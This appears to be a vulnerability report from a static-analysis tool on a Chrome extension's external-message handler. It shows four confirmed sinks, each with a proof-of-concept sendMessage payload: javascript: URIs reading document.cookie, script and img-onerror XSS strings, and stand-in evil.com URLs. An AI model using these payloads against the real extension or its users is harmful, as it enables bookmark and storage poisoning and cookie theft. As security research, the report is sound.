# CoCo Analysis: jajnhbonobojdghnpiedknciophllngc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4

---

## Sink 1: bg_chrome_runtime_MessageExternal → BookmarkCreate_sink (title)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jajnhbonobojdghnpiedknciophllngc/opgen_generated_files/bg.js
Line 980    title: request.title,

**Code:**

```javascript
// Background script (bg.js) - Lines 973-991
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
    console.log("onMessageExternal", request);
    if (request.checkStatus) {
        sendResponse({ success: true });
    }
    else if (request.addBookmarkUrl) {
        chrome.bookmarks.create({
            title: request.title, // ← attacker-controlled
            url: request.addBookmarkUrl // ← attacker-controlled
        }, () => {
            chrome.storage.local.set({
                [request.addBookmarkUrl]: request.bookCoverUrl,
                [`${request.addBookmarkUrl}::expired`]: request.expired
            }, () => {
                sendResponse({ success: true });
            });
        });
        return true;
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain (e.g., https://nubereader.odilo.com)
chrome.runtime.sendMessage(
    'jajnhbonobojdghnpiedknciophllngc',
    {
        addBookmarkUrl: 'http://evil.com',
        title: '<script>alert(document.cookie)</script>',
        bookCoverUrl: 'http://evil.com/cover.jpg',
        expired: '2025-12-31'
    }
);
```

**Impact:** An attacker controlling one of the whitelisted domains (*.nubereader.es, *.bibliotecadigital.ceibal.edu.uy, *.odilo.us, *.odilo.io, *.odilo.com, etc.) can inject arbitrary bookmarks with malicious titles and URLs into the user's browser. While bookmark creation itself has limited direct impact, combined with storage poisoning (Sinks 3-4), the attacker can inject malicious content that may be reflected back if the extension later reads and displays these bookmarks.

---

## Sink 2: bg_chrome_runtime_MessageExternal → BookmarkCreate_sink (url)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jajnhbonobojdghnpiedknciophllngc/opgen_generated_files/bg.js
Line 978    else if (request.addBookmarkUrl) {

**Code:**

```javascript
// Background script (bg.js) - Lines 978-981
else if (request.addBookmarkUrl) {
    chrome.bookmarks.create({
        title: request.title,
        url: request.addBookmarkUrl // ← attacker-controlled
    }, () => {
        chrome.storage.local.set({
            [request.addBookmarkUrl]: request.bookCoverUrl,
            [`${request.addBookmarkUrl}::expired`]: request.expired
        }, () => {
            sendResponse({ success: true });
        });
    });
    return true;
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain
chrome.runtime.sendMessage(
    'jajnhbonobojdghnpiedknciophllngc',
    {
        addBookmarkUrl: 'javascript:alert(document.cookie)',
        title: 'Malicious Bookmark',
        bookCoverUrl: 'http://evil.com/cover.jpg',
        expired: '2025-12-31'
    }
);
```

**Impact:** Attacker can create bookmarks with arbitrary URLs including javascript: URIs or malicious URLs that could be used for phishing or malware distribution.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (expired)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jajnhbonobojdghnpiedknciophllngc/opgen_generated_files/bg.js
Line 985    [`${request.addBookmarkUrl}::expired`]: request.expired

**Code:**

```javascript
// Background script (bg.js) - Lines 983-988
chrome.storage.local.set({
    [request.addBookmarkUrl]: request.bookCoverUrl,
    [`${request.addBookmarkUrl}::expired`]: request.expired // ← attacker-controlled
}, () => {
    sendResponse({ success: true });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain
chrome.runtime.sendMessage(
    'jajnhbonobojdghnpiedknciophllngc',
    {
        addBookmarkUrl: 'http://evil.com',
        title: 'Evil',
        bookCoverUrl: 'http://evil.com/cover.jpg',
        expired: '<img src=x onerror=alert(1)>'
    }
);
```

**Impact:** Storage poisoning - attacker can inject arbitrary data into extension storage. If the extension later retrieves and displays this expired date without sanitization, it could lead to stored XSS or other injection attacks.

---

## Sink 4: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (bookCoverUrl)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jajnhbonobojdghnpiedknciophllngc/opgen_generated_files/bg.js
Line 984    [request.addBookmarkUrl]: request.bookCoverUrl

**Code:**

```javascript
// Background script (bg.js) - Lines 983-988
chrome.storage.local.set({
    [request.addBookmarkUrl]: request.bookCoverUrl, // ← attacker-controlled
    [`${request.addBookmarkUrl}::expired`]: request.expired
}, () => {
    sendResponse({ success: true });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain
chrome.runtime.sendMessage(
    'jajnhbonobojdghnpiedknciophllngc',
    {
        addBookmarkUrl: 'http://legitimate.com',
        title: 'Book',
        bookCoverUrl: 'javascript:alert(document.cookie)',
        expired: '2025-12-31'
    }
);
```

**Impact:** Storage poisoning with malicious bookCoverUrl. If the extension later retrieves and uses this URL (e.g., as an image src), the attacker can inject malicious content or track users through the image request.
